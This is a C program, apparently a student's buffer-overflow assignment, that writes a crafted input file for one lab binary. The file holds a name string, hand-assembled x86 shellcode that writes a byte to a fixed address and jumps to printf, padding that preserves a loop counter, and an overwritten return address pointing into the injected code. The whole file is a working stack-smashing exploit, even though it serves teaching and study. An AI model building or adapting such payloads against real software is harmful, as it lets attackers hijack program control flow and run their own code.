/*------------------------------------------------------*/
/*              Name: Athanasios Ioannis                */
/*              Surname: Xanthopoylos                   */
/*              AM: 4702                                */
/*              Date: 12-05-2023                        */
/*              Assignment: 6                           */
/*                                                      */
/*           Buffer overflow attack and H4CK1NG         */
/*------------------------------------------------------*/

#include <stdlib.h>
#include <stdio.h>

int main(){
	FILE *data9;
	int i;
	/*Create the data9 file and write in it*/
        data9 = fopen("data9","w");

	/*16 BYTES*/
	fputc('T',data9); /*Write my name in the buffer*/
        fputc('h',data9);
        fputc('a',data9);
        fputc('n',data9);
        fputc('a',data9);
        fputc('s',data9);
        fputc('i',data9);
        fputc('s',data9);
        fputc(' ',data9);
        fputc('X',data9);
        fputc('a',data9);
        fputc('n',data9);
        fputc('t',data9);
        fputc('h',data9);
        fputc('o',data9);
	fputc('\0',data9);
	/*14 BYTES*/
	fputc(0xC6,data9); /*movb   $0x39,0x80e3068*/
        fputc(0x05,data9); /*0xC6 0x05(movb) + address in little endian + 0x39(9)*/
        fputc(0x68,data9); /*7 BYTES*/
        fputc(0x30,data9);
        fputc(0x0E,data9);
        fputc(0x08,data9);
        fputc(0x39,data9);

	fputc(0xB8,data9); /*movl $0x08049ea2, %eax*/
        fputc(0x98,data9); /*0xB8(mov) + address of printf in main program*/
        fputc(0x9E,data9); /*The opcode 0xB8 has eax as encoded as default in it*/
        fputc(0x04,data9); /*5 BYTES*/
        fputc(0x08,data9);

	fputc(0xFF,data9); /*jmp eax*/
        fputc(0xE0,data9); /*0xFF(jmp) + 0xE0(eax)*/
			   /*2 BYTES*/

	/*Fill the rest of the buffer but when you reach the LS bit of
	 var i(pos=35B) make it again 35 so it doesnt reset back to i=0
	fill everything after that with 0*/
	for(i = 0; i < 15; i++){
		if(i == 4){ /*30+5 Bytes = LS of var i*/
			fputc(0x23,data9);
		}
		fputc(0, data9);
	}

        fputc(0x98,data9);	/*Add the ebp but it is not need*/
        fputc(0xf3,data9);
        fputc(0xff,data9);
        fputc(0xbf,data9);

        fputc(0xEC,data9);	/*Change the R.A. to go to the machine code */
        fputc(0x42,data9);	/*saved in buffer+16 bytes. We cant access the*/
        fputc(0x0E,data9);	/*buffer after the func ended but we have the*/
        fputc(0x08,data9);	/*name+machine code saved in string s(Name)*/

        fputc(0xDC,data9);	/*Add the address of &Name back */
        fputc(0x42,data9);
        fputc(0x0E,data9);
        fputc(0x08,data9);
	/*Close the file*/
	fclose(data9);
	return 0;
}
